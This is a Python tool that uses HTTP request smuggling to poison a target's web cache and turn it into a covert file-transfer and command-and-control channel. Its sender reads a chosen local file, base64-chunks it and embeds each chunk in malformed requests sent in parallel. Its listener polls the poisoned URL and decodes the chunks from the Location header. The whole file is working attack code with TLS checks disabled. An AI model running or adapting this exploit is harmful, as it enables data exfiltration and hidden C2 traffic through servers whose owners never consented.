import os
import ssl
import time
import base64
import socket
import urllib3
import requests
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class CachingChannel(object):
    def __init__(self, url: str, listener: bool, sender: bool):
        self.url: str = url
        self.listener: bool = listener
        self.sender: bool = sender
        self.file_chunks: list = []
        self.url_parts: tuple = self.return_parsed_url_tuple(self.url)

        if self.url_parts and self.listener:
            self.request_location_header_loop()
        elif self.url_parts and self.sender:
            self.setup_cache_poisoning()
            self.send_chunks_parallel(self.file_chunks, self.url_parts[1], self.url_parts[2])

    @staticmethod
    def return_parsed_url_tuple(url) -> tuple or None:
        """
        Parses a single URL into a tuple containing (scheme, host, port, path).

        :param url: The URL string to parse.
        :return: Tuple of (scheme, host, port, path) or None if invalid.
        """
        parsed_url = urlparse(url)
        host = parsed_url.hostname
        if host is None:
            return None
        path = parsed_url.path or "/"
        scheme = parsed_url.scheme
        port = parsed_url.port
        if port is None:
            if scheme == "https":
                port = 443
            elif scheme == "http":
                port = 80
        return scheme, host, port, path

    @staticmethod
    def read_and_chunk_file(file_path, chunk_size=4096) -> list:
        """
        Reads a file from disk, splits its contents into raw chunks of the specified size,
        Base64-encodes each chunk, and returns a list of tuples containing metadata and data.

        Each tuple contains:
            (chunk_number, total_chunks, base64_encoded_chunk)

        :param file_path: Path to the file to be read and chunked.
        :param chunk_size: Size in bytes for each raw chunk before encoding (default is 4096).
        :return: List of tuples with chunk number, total number of chunks, and Base64-encoded data.
        :raises FileNotFoundError: If the specified file does not exist.
        """
        if not os.path.isfile(file_path):
            raise FileNotFoundError(f"The file {file_path} does not exist.")
        file_size = os.path.getsize(file_path)
        total_chunks = (file_size + chunk_size - 1) // chunk_size
        chunks = []
        with open(file_path, 'rb') as f:
            chunk_number = 1
            while True:
                data = f.read(chunk_size)
                if not data:
                    break
                encoded = base64.b64encode(data).decode('utf-8')
                chunks.append((chunk_number, total_chunks, encoded))
                chunk_number += 1
        return chunks

    @staticmethod
    def build_malformed_http_request(url: tuple, chunk: str) -> bytes:
        """
        Build a malformed HTTP request, embedding the chunk as part of the fake sub-request.

        :param url: Tuple containing (scheme, host, port, path).
        :param chunk: Base64-encoded file chunk to insert.
        :return: Raw HTTP request bytes.
        """

        scheme, host, port, path = url
        embedded_request = f"GET /deadaed{chunk}daedead HTTP/1.1\r\nX-YzBqv: "
        content_length = len(embedded_request.encode('utf-8'))


        '''
        This is where you will enter your own template as seen below. The below template is a generic nameprefix1 gadget -
        but this will be whatever template your target is vulnerable to.
        '''
        
        http_request = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {host.strip()}\r\n"
            f"Accept-Encoding: gzip, deflate, br\r\n"
            f"Accept: */*\r\n"
            f"Accept-Language: en-US;q=0.9,en;q=0.8\r\n"
            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36\r\n"
            f"Connection: keep-alive\r\n"
            f"Cache-Control: max-age=0\r\n"
            f"Via: null\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Foo: bar\r\n"
            f" Content-Length: {content_length}\r\n"
            f"\r\n"
            f"{embedded_request}"
        )
        return http_request.encode('utf-8')

    def request_location_header_loop(self):
        """
        Makes up to 100 sequential HTTP(S) requests to self.url (2 seconds apart),
        extracts and prints the data from the first 'deadaed' marker onward in the 'Location' header.

        Handles schema, host, port, and path as parsed by self.return_parsed_url_tuple.
        """
        if not self.url_parts:
            print("Invalid URL configuration.")
            return
        scheme, host, port, path = self.url_parts
        if scheme not in ('http', 'https'):
            print(f"Unsupported scheme: {scheme}")
            return
        print(f"--> Polling for channel data on : {self.url}\n")

        for i in range(1, 101):
            try:
                response = requests.get(self.url, allow_redirects=False, timeout=5, verify=False)
                location = response.headers.get('Location', None)
                if location:
                    start = location.find('deadaed')
                    if start != -1:
                        start += len('deadaed')  # Move past the marker
                        end = location.find('daedead', start)
                        if end != -1:
                            data_chunk = location[start:end]  # Extract the payload
                            print(f"[{i}] Data received    : {data_chunk}")
                            try:
                                decoded = base64.b64decode(data_chunk).decode('utf-8', errors='replace')
                                print(f"[{i}] Decoded data     : {decoded}")
                            except Exception as decode_err:
                                print(f"[{i}] Failed to decode: {decode_err}")
                            return
                        else:
                            continue
                    else:
                        continue
                else:
                    continue
            except requests.RequestException as e:
                print(f"[{i}] Request failed: {e}")
            finally:
                time.sleep(2)

    def setup_cache_poisoning(self):
        """
        Prompts the user for a file path and chunk size, reads the file, splits it into Base64-encoded chunks,
        and stores the result in self.file_chunks for later use.

        The method handles invalid input by defaulting to a chunk size of 4096 bytes and catches any errors during
        file reading or chunking.

        Prints the total number of chunks and details about each one (index, total, and character length).
        """
        file_path = input("==> Enter the path to the file: ").strip()
        try:
            chunk_size = int(input("\n==> Enter desired raw chunk size (in bytes): ").strip())
        except ValueError:
            print("??? Invalid input, using default chunk size of 4096 bytes.")
            chunk_size = 2048

        try:
            chunks = self.read_and_chunk_file(file_path, chunk_size)
            print(f"\n==> File successfully split into {len(chunks)} Base64-encoded chunks!\n")
            for chunk_number, total_chunks, chunk_data in chunks:
                print(f"[{chunk_number}/{total_chunks}] {len(chunk_data)} characters (Base64)")
            self.file_chunks = chunks
        except Exception as e:
            print(f"!!! Error: {e}")

    def send_chunk(self, host: str, port: int, chunk: str):
        """
        Open a socket connection to the target host:port and send the malformed HTTP request.
        Uses SSL if the scheme is 'https' or the port is 443.

        :param host: Target server IP or hostname.
        :param port: Target server port.
        :param chunk: Base64-encoded chunk to send.
        """
        try:
            request_bytes = self.build_malformed_http_request(self.url_parts, chunk)

            scheme = self.url_parts[0] if self.url_parts else 'http'
            if scheme == "https":
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                client_socket = socket.create_connection((host, port), timeout=5)
                client_socket = context.wrap_socket(client_socket, server_hostname=host)
            else:
                client_socket = socket.create_connection((host, port), timeout=5)

            client_socket.sendall(request_bytes)
            _ = client_socket.recv(4096)

        except Exception as e:
            print(f"[!] Error sending chunk: {e}")

    def send_chunks_parallel(self, chunks: list, host: str, port: int = 80):
        """
        For each chunk, send the request 8 times in parallel using threads.

        :param chunks: List of (chunk_num, total_chunks, base64_chunk) tuples.
        :param host: Target server address.
        :param port: Target server port.
        """
        for i in range(3):
            with ThreadPoolExecutor(max_workers=8) as executor:
                for chunk_num, total, chunk in chunks:
                    print(f"[+] Sending Chunk {chunk_num}/{total} for C2 data channel...")
                    _ = [executor.submit(self.send_chunk, host, port, chunk) for _ in range(10)]
            time.sleep(10)
